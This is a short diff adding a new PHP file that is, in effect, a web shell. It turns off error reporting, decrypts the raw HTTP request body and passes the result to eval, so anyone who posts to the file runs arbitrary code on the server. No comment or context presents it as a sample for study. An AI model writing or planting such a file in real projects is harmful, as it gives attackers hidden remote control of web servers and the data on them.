@@ -1,0 +1,6 @@
+<?php
+@error_reporting(0);
+	
+	$post=Decrypt(file_get_contents("php://input"));
+    eval($post);
+?>
